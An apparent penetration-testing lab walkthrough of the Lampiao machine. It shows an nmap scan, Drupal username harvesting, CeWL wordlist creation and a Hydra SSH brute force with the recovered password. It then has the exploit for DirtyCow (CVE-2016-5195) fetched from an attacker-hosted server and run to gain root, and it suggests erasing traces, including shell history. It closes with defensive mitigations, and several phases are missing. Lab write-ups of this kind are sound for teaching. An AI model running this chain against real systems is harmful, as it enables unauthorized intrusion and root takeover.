Phase 1: Network Discovery

Identifying Live Hosts

The first step in any penetration test is identifying active systems on the target network. We use an ICMP ping sweep to discover live hosts.

# Scan the subnet for live hosts
kali@attacker:~$ nmap -sn 192.168.56.0/24
Starting Nmap 7.94 (https://nmap.org)
Nmap scan report for 192.168.56.1
Nmap scan report for 192.168.56.100
Nmap scan report for 192.168.56.103
Host is up (0.0012s latency).
Target identified: 192.168.56.103
Attacker Thinking

"Before attacking anything, I must first identify which systems are active. Scanning the subnet reveals live targets and narrows my focus."

The -sn flag performs a ping scan (host discovery) without port scanning. This is fast and low-noise, ideal for initial reconnaissance.

Phase 2: Port Scanning

Service Enumeration

Once the target is identified, we scan for open ports and running services to map the attack surface.

-sC
Run default NSE scripts — automated enumeration of service details, vulnerabilities, and configuration issues.
-sV
Probe open ports to determine service version information — critical for identifying vulnerable software versions.
Attacker Thinking

"The web application is likely my entry point. SSH is open, which means if I can find credentials, I can get a shell. Version information helps me plan specific attacks."

Phase 3: Web Enumeration

Drupal CMS Discovery

Browsing to port 1898 reveals a Drupal CMS instance. Exploring the site exposes critical information — including author usernames.

# Browse to Drupal CMS
kali@attacker:~$ curl -s http://192.168.56.103:1898/ | grep -i "author\|user\|name"
<span class="username">tiago</span>
<span class="username">Eder</span>

# Usernames discovered:
tiago
Eder
Attacker Thinking

"CMS author pages publicly expose usernames. Developers often reuse the same username across services — these Drupal usernames might work for SSH login too."

Real-World Insight
CMS platforms often leak user information through author pages, blog posts, or comments. Username enumeration is a critical reconnaissance step because people frequently reuse usernames across different systems.

Phase 4: Drupal CMS Architecture

How Drupal Works

Understanding the underlying architecture helps attackers identify weak points in the CMS stack.

↓

↓

Attack Surfaces

  • • Exposed user enumeration
  • • Plugin/module vulnerabilities
  • • SQL injection via database layer
  • • Authentication bypass vectors
  • • Configuration file disclosure

Why Usernames Matter

CMS user accounts are often linked to content authors. Developers frequently use the same usernames for system accounts (SSH, FTP, database).

A username is half the credential — reducing brute-force complexity from exponential to linear.

Phase 5: Username Enumeration

Building the Target List

With usernames extracted from the CMS, we create a targeted username list for credential attacks.

kali@attacker:~$ echo "tiago" > usernames.txt
kali@attacker:~$ echo "Eder" >> usernames.txt
kali@attacker:~$ cat usernames.txt
tiago
Eder
Attacker Thinking

"Every username I discover reduces the search space for credential attacks. If CMS usernames match system usernames, I can directly target SSH authentication."

Phase 6: Password Generation with CEWL

Targeted Wordlist Generation

Generic wordlists (like rockyou.txt) contain millions of entries. CEWL creates a focused, context-aware password list by crawling the target website.

# Crawl the Drupal site and generate a custom wordlist
kali@attacker:~$ cewl http://192.168.56.103:1898/?q=node/1 -w pass.txt
CeWL 6.1 (Max Length) Open Source Tool
Crawling: http://192.168.56.103:1898/?q=node/1
Words extracted: 127
Wordlist saved to: pass.txt
Website Content
→
Word Extraction
→
Custom Password List
→
Credential Attack

Why CEWL Works

  • • Extracts real words from site content
  • • Users choose passwords related to their content
  • • Contextual words beat generic dictionaries
  • • Small list = faster brute-force attacks

vs Generic Wordlists

rockyou.txt
14 million passwords — hours to test. Contains mostly irrelevant entries.
CEWL (127 words)
127 targeted words — tested in seconds. Contains site-relevant vocabulary the user likely chose from.

Phase 7: Hydra Brute Force Attack

SSH Credential Attack

With a username list and targeted password list, we launch Hydra against the SSH service.

# Launch targeted brute-force attack on SSH
kali@attacker:~$ hydra -L usernames.txt -P pass.txt -o hydra.txt -e nsr -f -t 4 ssh://192.168.56.103
Hydra v9.5 (c) 2023 by van Hauser/THC
[DATA] max 4 tasks per target, 2 targets
[DATA] attacking ssh://192.168.56.103:22/
[22][ssh] host: 192.168.56.103
login: tiago password: Virgulino
[STATUS] attack finished (valid credentials found)
OptionMeaningWhy Important
-LUsername list fileTests multiple usernames, not just one
-PPassword list fileUses targeted, context-aware passwords
-oOutput fileSaves results for later reference
-e nsrTry null, same, reverseAccounts for common password patterns

Attacker Thinking

"Weak credentials are the easiest entry point. With just 2 usernames and 127 targeted passwords, I can test every combination in under a minute. The -e nsr flag also checks if the password is null, same as username, or reversed — common user mistakes."

Phase 10: Privilege Escalation Methodology

From User to Root

Privilege escalation is the process of moving from a low-privilege account to a higher-privilege one — typically root or administrator.

User (tiago)
↓
Privilege Escalation
↓
Root (full control)

Common Vectors

  • • Kernel vulnerabilities (DirtyCow)
  • • Misconfigured sudo permissions
  • • SUID binary exploitation
  • • Cron job abuse
  • • Service exploitation

Why Enumerate First

Blindly running exploits without understanding the system is dangerous and ineffective. Enumeration reveals:

  • • Exact kernel version
  • • Architecture (32 vs 64-bit)
  • • Available compilers
  • • Installed security patches
  • • Filesystem layout

Automated Vulnerability Matching

"LES automates the exploit research process. Instead of manually searching for vulnerabilities, I get a targeted list of exploits that match this specific kernel version. DirtyCow is highly reliable for this kernel."

Phase 12: DirtyCow Vulnerability Deep Dive

CVE-2016-5195 — Understanding the Exploit

DirtyCow is a race condition in the Linux kernel's copy-on-write (COW) mechanism that allows an unprivileged user to write to read-only memory mappings.

Read-Only File (e.g., /etc/passwd)
▼
Race Condition in COW Handler
▼
Unauthorized Write Access Gained
▼
Privilege Escalation

Technical Breakdown

  • • COW: Kernel optimization that shares memory pages until a write occurs
  • • Race: Concurrent access creates a window where permissions are bypassed
  • • Write: Unauthorized modification of protected system files
  • • Escalation: Attacker adds new root user or modifies existing credentials

Real-World Impact

CVE-2016-5195
Discovered in 2016, DirtyCow affected Linux kernels from 2.6.22 (2007) to 4.8.3 (2016). It was exploited in real-world attacks before being patched. The vulnerability existed for 9 years before discovery.
Impact Score
CVSS 7.8 (High) — requires local access but no authentication. Complete system compromise is possible with a single binary.

Phase 13: DirtyCow Exploitation

From User to Root

We download, compile, and execute the DirtyCow exploit to escalate privileges to root.

# On Kali: Download exploit
kali@attacker:~$ wget https://www.exploit-db.com/download/40847.cpp -O dirtycow.cpp
kali@attacker:~$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 ...

# On Target: Transfer exploit
tiago@Lampiao:/tmp$ wget http://<KALI_IP>/dirtycow.cpp
2024-01-15 14:35:10 (3.1 MB/s) - 'dirtycow.cpp' saved

# Compile exploit
tiago@Lampiao:/tmp$ g++ -o dirtycow dirtycow.cpp -Wall -O2 -std=c++11 -pthread -lutil
(no errors — compilation successful)

# Run exploit
tiago@Lampiao:/tmp$ chmod +x dirtycow && ./dirtycow

"Read the exploit output carefully — it tells you the newly created root username and password. These are randomly generated by the exploit and printed to stdout."

Phase 15: Cleanup & OPSEC

Operational Security

Professional penetration testers remove artifacts and tools to maintain operational security and leave the target system in its original state.

# Remove exploit artifacts
root@Lampiao:/tmp# rm /tmp/dirtycow.cpp
root@Lampiao:/tmp# rm /tmp/dirtycow
root@Lampiao:/tmp# rm /tmp/linux-exploit-suggester.sh
root@Lampiao:/tmp# rm /tmp/passwd.bak
Artifacts removed.

Why Cleanup Matters

  • • Detection: Leftover files trigger security alerts
  • • Forensics: Tools help blue teams trace attack paths
  • • Professionalism: Clean testing demonstrates discipline
  • • Stealth: Reduces chance of being discovered during assessment

Best Practices

  • • Clean /tmp and /dev/shm after use
  • • Remove uploaded tools and scripts
  • • Clear shell history if needed
  • • Restore modified system files
  • • Log out of all sessions cleanly

Defensive Security Perspective

Understanding how each attack phase could have been prevented.

Strong Password Policies

The entire attack chain relied on weak credentials. Enforcing minimum complexity, length requirements, and password expiration would have prevented the Hydra attack. Password "Virgulino" would fail any modern password policy.

Multi-Factor Authentication (MFA)

Even if credentials were compromised, SSH MFA (TOTP, U2F, or certificate-based auth) would block unauthorized access. This is the single most effective defense against credential attacks.

Patch Management

The kernel vulnerability (CVE-2016-5195) was patched in 2016. Running Ubuntu 14.04 without security updates for years guaranteed exploitation. Regular patching eliminates entire classes of privilege escalation attacks.

SSH Hardening

Disabling password-based authentication, using key-only access, changing the default port, and implementing fail2ban would stop brute-force attacks entirely. Rate-limiting also mitigates Hydra-style attacks.

CMS Security Hardening

Disabling user enumeration, removing author page visibility to anonymous users, and implementing WAF rules would prevent username harvesting. Limiting login attempts also prevents brute-force discovery.

Least Privilege & Kernel Hardening

Even with user access, proper SELinux/AppArmor policies, kernel hardening (KASLR, SMEP, SMAP), and regular updates would block DirtyCow and similar kernel exploits.

Account Lockout Policies

Implementing account lockout after 3-5 failed SSH login attempts would make brute-force attacks impractical. Combined with logging and alerting, this creates both preventive and detective controls.

Final Lessons Learned

We didn't hack randomly — we followed a chain of weaknesses.
Lampiao Machine — Full Attack Chain
01

Reconnaissance

Systematic network discovery and port scanning identifies the target and maps the attack surface before any exploitation begins.

02

Username Discovery

CMS platforms leak user information through author pages. Web usernames often match system usernames — a critical information disclosure.

03

Credential Attacks

Targeted wordlists (CEWL) combined with automated brute-force tools (Hydra) can crack weak credentials in minutes when SSH is exposed.

04

SSH Compromise

Weak credentials provide the easiest entry point. Once SSH access is obtained, the attacker has a foothold on the system for further exploitation.

05

Privilege Escalation

Kernel enumeration reveals outdated software. Linux Exploit Suggester automates vulnerability matching, identifying DirtyCow as the escalation path.

06

Kernel Exploitation

DirtyCow exploits a race condition in copy-on-write to modify protected system files. Old kernels that are not patched are trivially exploitable.
